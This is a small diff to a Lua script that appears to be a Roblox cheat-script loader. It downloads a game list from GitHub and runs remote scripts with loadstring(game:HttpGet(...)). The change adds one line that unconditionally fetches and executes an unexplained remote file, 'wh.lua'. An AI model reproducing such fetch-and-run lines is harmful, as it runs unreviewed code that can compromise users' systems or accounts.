@@ -1,5 +1,5 @@
 local Games = loadstring(game:HttpGet("https://raw.githubusercontent.com/SheepCounting/main/refs/heads/main/list"))()
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SheepCounting/main/refs/heads/main/wh.lua"))()
 for PlaceID, Execute in pairs(Games) do
     if PlaceID == game.PlaceId then
         loadstring(game:HttpGet(Execute))()
